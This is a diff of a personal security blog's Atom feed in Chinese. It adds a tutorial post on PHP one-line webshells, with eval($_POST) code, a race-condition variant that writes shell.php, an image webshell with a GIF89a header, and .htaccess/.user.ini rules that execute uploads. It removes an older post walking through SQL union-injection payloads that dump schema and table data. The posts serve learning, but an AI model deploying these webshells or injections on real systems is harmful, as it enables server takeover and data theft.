@@ -6,7 +6,7 @@
   <link href="https://liu1272.github.io/atom.xml" rel="self"/>
   
   <link href="https://liu1272.github.io/"/>
-  <updated>2023-04-15T19:26:35.882Z</updated>
+  <updated>2023-04-16T15:14:06.042Z</updated>
   <id>https://liu1272.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一句话木马</title>
+    <link href="https://liu1272.github.io/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
+    <id>https://liu1272.github.io/2023/04/16/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
+    <published>2023-04-16T15:01:00.000Z</published>
+    <updated>2023-04-16T15:14:06.042Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h4><p>  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。<br>  这种木马可以以上传文件、修改配置等方式将恶意代码植入到受害者服务器上<br>  然后通过一些特殊手法在服务器端执行，以达到入侵控制目的。</p><h4 id="常见的一句话木马"><a href="#常见的一句话木马" class="headerlink" title="常见的一句话木马"></a>常见的一句话木马</h4><p>我们接触的一句话木马大多为这种，它需要在PHP环境中才可使用</p><pre><code>&lt;?php @eval($_POST[cmd]);  ?&gt;</code></pre><h4 id="木马原理"><a href="#木马原理" class="headerlink" title="木马原理"></a>木马原理</h4><pre><code>（1）$_POST[cmd]    $_POST 是 PHP 中的一个超全局变量，POST方式提交的所有变量，都会保存在此数组中，变量名即为键名（2）eval()    eval() 函数在 PHP 中用于执行字符串中的代码并返回执行结果。    该函数对php语法要求严格，所传入语句必须以&quot; ; &quot;号结尾（3）@    符号@的作用是屏蔽该语句的报错信息    如果站点PHP版本&gt;=8.0的话会报错（4）脉络梳理    用eval函数，将我们post方式提交的名为cmd的变量，当做PHP代码执行，cmd变量可为任何攻击代码</code></pre><h4 id="可用于条件竞争的一句话木马"><a href="#可用于条件竞争的一句话木马" class="headerlink" title="可用于条件竞争的一句话木马"></a>可用于条件竞争的一句话木马</h4><pre><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])；  ?&gt;&#39; ); ?&gt;</code></pre><p>这段代码是用来创建一个名为shell.php的文件，并在其中写入一段代码。<br>这段代码的作用是接受一个POST请求中的cmd参数，并将其作为PHP代码执行。</p><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p><strong>木马内容</strong></p><pre><code>GIF89a&lt;?php @eval($_POST[cmd])；  ?&gt; //GIF89a 为了绕过可能存在的MIME头检测</code></pre><p><strong>.htaccess文件</strong></p><pre><code>&lt;FilesMatch &quot;jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;//大体意思是设置当前目录所有带jpg的文件名都使用php解析//无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行</code></pre><p><strong>.user.ini扩展文件</strong></p><pre><code>auto_prepend_file=shell.jpg //意思就是当前目录中的php文件的页头会自动去包含shell.jpg中的文件内容//auto_append_file 是页尾包含</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h4 id=&quot;什么是一句话木马&quot;&gt;&lt;a href=&quot;#什么是一句话木马&quot; class=&quot;headerlink&quot; title=&quot;什么是一句话木马&quot;&gt;&lt;/a&gt;什么是一句话木马&lt;/h4&gt;&lt;p&gt;  一句话木马是一种短小精悍的恶意代码，通常只有一行之长。&lt;br&gt;  这种木马可以以上传文件</summary>
+      
+    
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
+    
+    
+    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>PHP反序列化</title>
@@ -436,30 +460,6 @@
       
     <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。&lt;br&gt;或者为真时返回正常页面，为假时跳转到其它页面等。&lt;/p&gt;
 &lt;h4</summary>
-      
-    
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
-    
-    
-    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL联合注入</title>
-    <link href="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
-    <id>https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
-    <published>2023-03-11T16:47:00.000Z</published>
-    <updated>2023-03-12T02:21:28.447Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p><p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p><pre><code>and 1=1</code></pre><p>（2）字符串型：闭合单引号测试语句</p><pre><code>&#39;and&#39;1&#39;=&#39;1</code></pre><p>3、判断查询列数</p><pre><code>select username,password from where username=&#39;root&#39; and password=123 order by x</code></pre><p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p><p>4、找到显示位</p><pre><code>?id=-1 union select 1,2,3,4,5,6 --+</code></pre><p>如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p><p>5、利用显示位获取库名</p><pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p><pre><code>?id=-1&#39; union select 1,database(),3 --+</code></pre><p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p><p>6、获取表名</p><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></pre><p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p><p>7、查询表中列名</p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p><p>8、获取字段信息</p><pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+</code></pre><p>平平无奇，跟上面的没啥不同，等价于下面这条</p><pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+</code></pre><h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p><h4 id="白盒测试（优化程序）"><a href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p><h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;SQL联合注入&quot;&gt;&lt;a href=&quot;#SQL联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL联合注入&quot;&gt;&lt;/a&gt;SQL联合注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
       
     
     
